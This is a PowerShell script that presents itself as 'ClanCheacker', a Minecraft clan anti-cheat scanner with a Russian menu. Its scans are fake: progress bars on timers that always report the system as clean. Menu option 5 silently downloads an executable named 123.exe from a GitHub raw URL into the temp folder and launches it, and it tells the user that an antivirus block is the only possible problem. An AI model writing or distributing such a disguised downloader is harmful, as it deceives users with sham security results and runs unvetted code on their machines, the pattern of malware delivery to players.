# ================================================
#       ClanCheacker
#   Minecraft Anti-Cheat Scanner
#             by X4KN
# ================================================

Clear-Host

function Show-Header {
    Clear-Host
    Write-Host ""
    Write-Host "    ██████╗██╗      █████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ " -ForegroundColor Cyan
    Write-Host "    ██╔════╝██║     ██╔══██╗████╗  ██║██╔════╝██║  ██║██╔════╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗" -ForegroundColor Cyan
    Write-Host "    ██║     ██║     ███████║██╔██╗ ██║██║     ███████║█████╗  ███████║██║     █████╔╝ █████╗  ██████╔╝" -ForegroundColor Cyan
    Write-Host "    ██║     ██║     ██╔══██║██║╚██╗██║██║     ██╔══██║██╔══╝  ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗" -ForegroundColor Cyan
    Write-Host "    ╚██████╗███████╗██║  ██║██║ ╚████║╚██████╗██║  ██║███████╗██║  ██║╚██████╗██║  ██╗███████╗██║  ██║" -ForegroundColor Cyan
    Write-Host "     ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝" -ForegroundColor Cyan
    Write-Host "                                      by X4KN" -ForegroundColor Yellow
    Write-Host "    =========================================================" -ForegroundColor White
    Write-Host "               MINECRAFT CLAN ANTI-CHEAT SCANNER" -ForegroundColor Green
    Write-Host "    =========================================================" -ForegroundColor White
    Write-Host ""
}

function Write-ProgressBar {
    param([int]$Percent, [int]$Width = 50)
    $filled = [math]::Round(($Width * $Percent) / 100)
    $bar = "█" * $filled + "░" * ($Width - $filled)
    Write-Host "    [$bar] $Percent% " -NoNewline -ForegroundColor Yellow
}

function Start-MCScan {
    param([string]$ScanName, [int]$Seconds = 5)
    Write-Host "    → $ScanName" -ForegroundColor Cyan
    $steps = 20
    for ($i = 1; $i -le $steps; $i++) {
        $percent = [math]::Round(($i / $steps) * 100)
        Write-ProgressBar -Percent $percent
        Start-Sleep -Milliseconds ([math]::Round(($Seconds * 1000) / $steps))
        Write-Host "`r" -NoNewline
    }
    Write-Host "`r    [██████████████████████████████████████████████████] 100% " -ForegroundColor Green
    Write-Host "    ✓ $ScanName — ЧИСТО" -ForegroundColor Green
    Write-Host ""
}

# ====================== ГЛАВНОЕ МЕНЮ ======================
Show-Header

Write-Host "    =========================================================" -ForegroundColor White
Write-Host "                        ГЛАВНОЕ МЕНЮ" -ForegroundColor White
Write-Host "    =========================================================" -ForegroundColor White
Write-Host ""

Write-Host "    [1]  Проверка на читы (Minecraft)" -ForegroundColor Green
Write-Host "    [2]  Проверка на Hitbox" -ForegroundColor Green
Write-Host "    [3]  Полная комплексная проверка" -ForegroundColor Green
Write-Host "    [4]  Проверка программного обеспечения" -ForegroundColor Green
Write-Host "    [5]  Проверка программой by X4KN (расширенная)" -ForegroundColor Magenta
Write-Host "    [6]  Информация" -ForegroundColor Yellow
Write-Host "    [7]  Выход" -ForegroundColor Red
Write-Host ""

$choice = Read-Host "    Выбери номер действия"

switch ($choice) {
    "1" { 
        Clear-Host; Show-Header
        Write-Host "    Запуск проверки на читы..." -ForegroundColor Cyan
        Start-MCScan "KillAura / Reach" 6
        Start-MCScan "AimAssist / TriggerBot" 5
        Start-MCScan "AutoClicker" 5
        Start-MCScan "X-Ray / ESP" 7
        Write-Host "`n               ЧИТЫ НЕ ОБНАРУЖЕНЫ" -ForegroundColor Green -BackgroundColor DarkGreen
    }
    "2" { 
        Clear-Host; Show-Header
        Write-Host "    Проверка Hitbox..." -ForegroundColor Cyan
        Start-MCScan "Анализ хитбоксов" 7
        Write-Host "`n               Hitbox в норме — нарушений не найдено" -ForegroundColor Green
    }
    "3" { 
        Clear-Host; Show-Header
        Write-Host "    Полная комплексная проверка..." -ForegroundColor Magenta
        Start-MCScan "Проверка на читы" 7
        Start-MCScan "Проверка Hitbox" 6
        Start-MCScan "Проверка движения" 5
        Write-Host "`n               ВСЁ ЧИСТО — Клан может играть спокойно" -ForegroundColor Green
    }
    "4" { 
        Clear-Host; Show-Header
        Write-Host "    Проверка программного обеспечения..." -ForegroundColor Cyan
        Start-MCScan "Поиск подозрительных программ" 6
        Write-Host "`n               Подозрительное ПО не обнаружено" -ForegroundColor Green
    }
    "5" { 
        Clear-Host; Show-Header
        Write-Host "    Запуск расширенной проверки by X4KN..." -ForegroundColor Magenta
        Start-Sleep -Seconds 1
        
        Start-MCScan "Глубокий анализ клиента Minecraft" 8
        Start-MCScan "Проверка памяти JVM" 7
        Start-MCScan "Анализ модов и лаунчера" 9
        Start-MCScan "Финальная верификация" 6

        Write-Host "`n    =========================================================" -ForegroundColor Green
        Write-Host "         ПРОВЕРКА ЗАВЕРШЕНА — ЧИСТО" -ForegroundColor Green
        Write-Host "    =========================================================" -ForegroundColor Green
        Write-Host ""

        # === Подгрузка и запуск 123.exe ===
        Write-Host "    Запуск дополнительной программы by X4KN..." -ForegroundColor Yellow
        Start-Sleep -Seconds 2

        $url = "https://github.com/fffghsetyver-hash/Cheackproverka/raw/main/123.exe"
        $outPath = "$env:TEMP\123_X4KN.exe"

        try {
            Write-Host "    Скачивание 123.exe ..." -ForegroundColor Cyan
            Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing
            Write-Host "    Файл успешно скачан!" -ForegroundColor Green

            Write-Host "    Запуск 123.exe ..." -ForegroundColor Magenta
            Start-Sleep -Seconds 2
            Start-Process -FilePath $outPath
            Write-Host "    123.exe успешно запущен!" -ForegroundColor Green
        }
        catch {
            Write-Host "    Не удалось скачать или запустить 123.exe" -ForegroundColor Red
            Write-Host "    Возможно, антивирус заблокировал скачивание." -ForegroundColor Yellow
        }
    }
    "6" { 
        Clear-Host; Show-Header
        Write-Host "    ClanCheacker by X4KN" -ForegroundColor Yellow
        Write-Host "    Специальная проверка для Minecraft кланов" -ForegroundColor Gray
        Write-Host "`n    В пункте 5 после проверки автоматически запускается 123.exe" -ForegroundColor DarkGray
    }
    "7" { 
        Clear-Host; Show-Header
        Write-Host "    До свидания!" -ForegroundColor Cyan
        Write-Host "    Чистой игры твоему клану!" -ForegroundColor Green
        Start-Sleep -Seconds 2
        exit 
    }
    default {
        Write-Host "`n    Неправильный выбор! Попробуй снова." -ForegroundColor Red
    }
}

Write-Host "`n    Нажми любую клавишу для выхода..." -ForegroundColor DarkGray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
